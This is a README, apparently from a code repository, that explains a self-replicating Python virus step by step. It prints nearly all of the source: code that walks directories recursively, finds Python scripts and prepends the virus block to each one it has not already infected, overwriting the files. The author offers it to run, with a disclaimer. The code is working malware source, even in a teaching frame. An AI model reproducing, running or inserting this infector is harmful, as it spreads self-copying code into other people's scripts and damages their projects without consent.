# Self Replicating Virus

## ** Disclaimer **

The information and code provided here, are inteded to be used for educational and research purposes only. Do not use the information for illegal activities, any actions and or activities related to the material contained within this repository is solely your responsibility. The author will not be held responsibile in the event of any criminal charges against any individual misusing the information provided here.

## TABLE OF CONTENTS

1. [What is it and how to use it](#what-is-it-and-how-to-use-it)
2. [A deeper dive](#a-deeper-dive)

## What is it and how to use it

The file `self_replicating_virus.py` (from now on the `virus`) contains the python code that, once run, steps over the following:

- It scans every file, and recursively every folder, in the same directory of the `virus`, searching and storing every python script it finds that do not contain the virus.

- It prepends itself to each of these python scripts.

In order to use it... just run it! (but please, put it in an isolated folder with dummy python scrypts if you do not want to infect your python files)

```
py self_replicating_virus.py
```

## A deeper dive

How does it work, though?

First, by inspecting it, we see that the virus is enclosed by two comments:

```py
##### START VIRUS #####

          .
          .
          .

###### END VIRUS ######
```

Well, this is pretty self-explanatory: these comments delimit the start and the end of the virus. They are used by the virus itself to be aware of what it has to copy to other python scripts (clearly something less obvious than `START VIRUS` could be used if someone wanted to create a real virus).

But let's run through the code in order.

```py
import os
import cryptography
from cryptography.fernet import Fernet

filesToInfect = []
payload = []
```

Firstly there are the libraries that the script needs and then there are some global variables defined. Their names are pretty self-explanatory, the first array (list) is going to store the filepath of the python scripts that the virus is going to infect and the second array will store each line of the virus that are going to be injected in the target files.

<hr/>

```py
def get_files_from_directory(dir):
  for root, subdirs, files in os.walk(dir):
    for file in files:
      if file.endswith('.py'):
        filesToInfect.append(os.path.join(root, file))
```

This function, as the name suggests, will walk through each file and directory (recursively) starting from the directory passed to it (`dir`) and once it finds a file with the extension `.py`, it will append this to the array defined before.

<hr/>

```py
def search_files_to_infect():
  rootDir = os.getcwd()
  get_files_from_directory(rootDir)
```

Using `os.getcwd()` the script gets the directory in which it sits, and pass it to the function defined before to get all the python scripts.

<hr/>

```py
def already_infected(file):
  with open(file, 'r') as f:
    for line in f:
      if "##### START VIRUS #####\n" == line:
        return True
    return False
```

Since we do not want to flood the scripts with duplicates of the virus, we check whether the file passed to the function `already_infected` is indeed already infected, if so, it returns `True`, otherwise it returns `False` (pretty ovbious, I guess).

<hr/>

```py
def compute_payload():
  with open(os.path.join(os.getcwd(), __file__), 'r') as virus:
    actual_payload = False
    for line in virus:
      if actual_payload:
        payload.append(line)
        if line == "###### END VIRUS ######\n":
          break
      if "##### START VIRUS #####\n" == line:
        payload.append("##### START VIRUS #####\n")
        actual_payload = True
```

Now it's time to compute the payload, namely run through the file and store each line from `##### START VIRUS #####` to `###### END VIRUS ######` in the payload array. In general, in fact, this code can be part of other code (for an infected script) and we just want to propagate the virus, not the complete script.

<hr/>

```py
def inject_payload(file):
  old_code = []
  with open(file, 'r') as f:
    old_code = f.readlines()

  new_code = []
  new_code.extend(payload)
  new_code.extend(old_code)

  with open(file, 'w') as f:
    f.writelines(new_code)
```

Finally it's time to infect the file. The function above will take a file as a parameter and will inject the payload into it at the beggining of the script. How does it do that? it first store the old script's lines in an array `old_code`, then it creates a new array `new_array` by extending the `payload` with the `old_code`. At the end, it writes these lines in the file, overriding its previous content (which is just appended to the payload code).

<hr/>

```py
search_files_to_infect()
compute_payload()

for file in filesToInfect:
  if not already_infected(file):
    inject_payload(file)
```

Here the methods defined above are called. So firstly we search for files to infect, then we compute the payload and then recursively for every python script found, we inject the payload.

And this is it, quite simple, but funny to play around!
